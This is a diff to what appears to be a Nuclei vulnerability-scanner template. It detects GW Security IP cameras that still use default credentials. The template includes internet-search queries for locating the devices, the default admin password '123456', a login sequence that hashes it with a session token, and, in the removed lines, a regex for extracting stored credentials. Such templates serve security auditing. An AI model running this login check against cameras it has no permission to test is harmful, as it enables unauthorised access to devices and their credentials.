@@ -5,8 +5,7 @@ info:
   author: mr-pmillz
   severity: high
   description: |
-    GW Security IP cameras with unchanged default credentials allow authenticated access to their user configuration endpoint.
-    This template checks encoded administrator credentials and looks for a user configuration response.
+    GW Security IP cameras with unchanged default credentials allow authenticated access to their user configuration endpoint. This template checks encoded administrator credentials and looks for a user configuration response.
   impact: |
     An attacker can retrieve camera account configuration and potentially obtain additional credentials from the response.
   remediation: |
@@ -16,44 +15,69 @@ info:
   classification:
     cwe-id: CWE-1392
   metadata:
+    verified: true
+    max-request: 3
+    shodan-query: 'http.html:"GW Security"'
+    fofa-query: 'body="GW Security"'
     vendor: gwsecurity
     product: ip_camera
-  tags: default-login,default-credentials,gwsecurity,network-camera,camera,intrusive
+  tags: default-login,gwsecurity,camera,intrusive
+
+variables:
+  username: admin
+  password: "123456"
+
+flow: http(1) && http(2) && http(3)
 
 http:
   - raw:
-      - |+
-        POST /getUserConfig HTTP/1.1
+      - |
+        GET / HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-        Accept: text/javascript, text/html, application/xml, text/xml, */*
-        X-Requested-With: XMLHttpRequest
-        Content-type: application/x-www-form-urlencoded
-        Connection: close
-        Cookie: DHLangCookie30=English
 
-        <?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope"><soap:Header><userid>{{username}}</userid><passwd>{{password}}</passwd></soap:Header><soap:Body></soap:Body></soap:Envelope>
-    payloads:
-      username:
-        - 52851dbd7918bbae # admin
-      password:
-        - a17faccd02661e4c # 123456
-        - 7656e77274aca3c6 # 888888
-        - 52851dbd7918bbae # admin
-    attack: clusterbomb
     matchers-condition: and
     matchers:
       - type: status
         status:
-          - 200
-      - type: word
-        part: body
-        words:
-          - "<UserConfig>"  # Check if the response contains the UserConfig tag
+          - 302
+
+        internal: true
+      - type: regex
+        part: header
+        regex:
+          - '(?im)^Location:\s*https?://[^/]+/login\.html\?t=[0-9]+'
+        internal: true
 
     extractors:
       - type: regex
-        part: body
-        name: "Extracted Credentials"
+        part: header
+        name: tid
+        group: 1
+        internal: true
         regex:
-          - 'Username="([^"]+)" Password="([^"]+)"'  # Extract both username and password in one regex
+          - '[?&]t=([0-9]+)'
+
+  - raw:
+      - |
+        GET /login.html?t={{tid}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'GW Security'
+        internal: true
+
+  - raw:
+      - |
+        POST /goform/formLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&tid={{tid}}&access={{md5(tid + ':' + password)}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
